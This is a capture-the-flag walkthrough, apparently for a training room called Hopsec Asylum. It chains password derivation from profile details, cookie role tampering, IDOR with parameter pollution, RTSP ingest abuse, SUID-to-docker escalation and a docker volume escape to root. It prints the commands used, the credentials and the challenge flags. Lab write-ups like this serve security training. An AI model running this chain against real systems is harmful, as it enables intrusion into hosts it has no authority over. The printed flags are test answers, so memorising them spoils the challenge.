# 🟩 Hopsec Asylum — Full Walkthrough (All Flags + IDOR + JSON Pollution + RTSP Ingest + Docker LPE)

**Author:** pxrnxdxmxn  

## Table of Contents
- Enumeration  
- Gaining Initial Access  
- Identifying the Target User (Hopkins)  
- Accessing the Asylum Map Console  
- Privilege Escalation Inside the Video Portal  
- IDOR + JSON Parameter Pollution Exploitation  
- Extracting Manifest and Playlist Files  
- RTSP Ingest Endpoint Discovery and Exploitation  
- Accessing Port 13404 (Guard Machine Access)  
- Host Machine Enumeration  
- Local Privilege Escalation via SUID Binary → Docker Group  
- Docker Escape → Full Root Shell  
- Locating Final SCADA Password & Root Flag  
- Lessons Learned  

---

## 1. Enumeration

Initial scan:

``nmap -p- -T4 -v 10.82.148.X``


<img width="705" height="672" alt="image" src="https://github.com/user-attachments/assets/84e33f43-3fda-41e2-b878-c2b6b4556f7b" />


Open ports:
- **80** — social network  
- **8080 / 13400** — login panels  
- **13401–13404** — backend APIs  
- **9001** — likely SCADA  
Ports 13401–13404 return: `unauthorized`.

---

## 2. Gaining Initial Access

Port 8000 hosts a social network. Creating an account reveals Hopkins’s accidental password leak — `Pizza1234$`, but it’s changed.  
Profile info:
- Email: `guard.hopkins@hopsecasylum.com`
- Birth year: **1982**
- Pet: **Johnnyboy**

Password derivation gives valid login:

``Johnnyboy1982!``


---

## 3. Identifying the Target User (Hopkins)

Port 8080 references Hopkins.  
Logging in reveals Asylum Map System.  
Flag #1:
``THM{h0pp1ing_m4d}``

---

## 4. Accessing the Asylum Map Console

Three doors:
- hopper  
- psych  
- exit  

Only **hopper** opens now.

---

## 5. Privilege Escalation Inside the Video Portal

Port **13400** hosts the camera console.

Developer Tools → Storage:

``hopsec_role = guard``

Change to:

``hopsec_role = admin``


<img width="1033" height="76" alt="image" src="https://github.com/user-attachments/assets/dafbd9d4-fe2c-4600-959e-264eb40e1bb8" />




→ unlocks restricted feed.

---

## 6. IDOR + JSON Parameter Pollution Exploitation

Admin camera request:


<img width="1280" height="761" alt="image" src="https://github.com/user-attachments/assets/698e476c-5587-4520-947f-f5a8c37ed3ee" />



POST /v1/streams/request
{"camera_id":"cam-admin","tier":"guard"}



<img width="1125" height="375" alt="image" src="https://github.com/user-attachments/assets/e4ef3bea-917f-41f2-ba64-ca8673d178a7" />





Server ignores JSON but reads **URL params**.

Exploit:
- URL: `/v1/streams/request?tier=admin`
- Body: `{
            "camera_id":"cam-admin","tier":"guard"
          }`  
- Result: admin ticket.


<img width="1216" height="394" alt="image" src="https://github.com/user-attachments/assets/25353e51-9901-47ee-b106-18557b27cda7" />




Output:
`{"effective_tier":"admin","ticket_id":"..."}`

---

## 7. Extracting Manifest and Playlist Files

Collect:
- manifest.m3u8  
- playlist000.ts  
- playlist001.ts

<img width="348" height="271" alt="image" src="https://github.com/user-attachments/assets/9930704d-fd5f-47bf-94e7-1a1e0a78e57b" />



Video reveals keypad code: **115879**

Entering code into 8080 → psych door gives:

**THM{Y0u_h4ve_b3en_**


<img width="533" height="371" alt="image" src="https://github.com/user-attachments/assets/9d0f1d0c-e1d8-4f06-8c88-b974132da7d1" />




Manifest reveals hidden endpoints:
/v1/ingest/diagnostics  
/v1/ingest/jobs  
`rtsp://vendor-cam.test/cam-admin`

---

## 8. RTSP Ingest Endpoint Discovery and Exploitation

### Step 1 — Trigger diagnostics ingest

curl -X POST http://10.82.148.X:13401/v1/ingest/diagnostics \
  -H 'Authorization: Bearer {jwt.guard}' \
  -H "Content-Type: application/json" \
  -d '{"rtsp_url":"rtsp://vendor-cam.test/cam-admin"}'

  Output contains job ID.

### Step 2 — Query job status
curl http://10.82.148.X:13401/v1/ingest/jobs/<job_id> \
-H 'Authorization: Bearer {jwt.guard}'

Returns **machine token**.



<img width="952" height="543" alt="image" src="https://github.com/user-attachments/assets/d76bcabe-d9bc-4e57-94ac-df8f6d2b4697" />




---

## 9. Accessing Port 13404 (Guard Machine Access)

Using machine token → open shell:


<img width="272" height="86" alt="image" src="https://github.com/user-attachments/assets/82b24b49-0f9c-463c-bfc9-303807122522" />



``user: svc_vidops``

##Flag #2:
/home/svc_vidops/user_part2.txt

---

## 10. Host Machine Enumeration

Standard enumeration:

``whoami`` 
``id``
``find / -perm -4000 2>/dev/null``

<img width="395" height="874" alt="image" src="https://github.com/user-attachments/assets/ce4bdaad-9407-427c-980e-fad60ad17ca3" />



Find SUID binary:
/usr/local/bin/diag_shell

Running it → restricted shell as:
**dockermgr**

Groups include `docker` (inactive).

---

## 11. Local Privilege Escalation via SUID Binary → Docker Group

Activate group:
`newgrp docker`

Check:
uid=1501 gid=998(docker)


<img width="631" height="257" alt="image" src="https://github.com/user-attachments/assets/4dd9deec-95a4-4515-a05d-d1170a18efd3" />



Docker socket:
`srw-rw---- root docker /run/docker.sock`

Full access to docker group achieved.

---

## 12. Docker Escape → Full Root Shell

List images:
`docker images`


<img width="962" height="450" alt="image" src="https://github.com/user-attachments/assets/c57b5162-dbf7-443b-a7b2-d9a002645fb6" />



Escape:
`docker run -v /:/host -it alpine chroot /host bash`

---

## 13. Locating Final SCADA Password & Root Flag

**SCADA backend under:** `/home/ubuntu`


<img width="700" height="245" alt="image" src="https://github.com/user-attachments/assets/1a950adb-2d75-404f-aa5f-d4badf4ff2d6" />




Within project files → unlock code for 8080.


<img width="696" height="356" alt="image" src="https://github.com/user-attachments/assets/4eb7d229-f27f-4ba8-9cac-f0a73800c2a3" />




Final flag retrieved (flag #3).



<img width="510" height="375" alt="image" src="https://github.com/user-attachments/assets/b184b3ca-0e2f-4de6-96c7-ae42632b145d" />



<img width="427" height="664" alt="image" src="https://github.com/user-attachments/assets/1e80cc3c-d76a-44a4-9625-c0a63cd1407c" />




---

## 14. Lessons Learned

This machine demonstrated:

- ✔ IDOR exploitation  
- ✔ JSON parameter pollution  
- ✔ Extracting HLS manifests & .ts streams  
- ✔ RTSP ingest abuse  
- ✔ Short-lived admin tokens  
- ✔ SUID → docker group escalation  
- ✔ Docker escape via `-v /:/host` + `chroot`  
- ✔ SCADA logic analysis  

A complete chain from web exploitation → backend abuse → LPE → full host compromise.

---











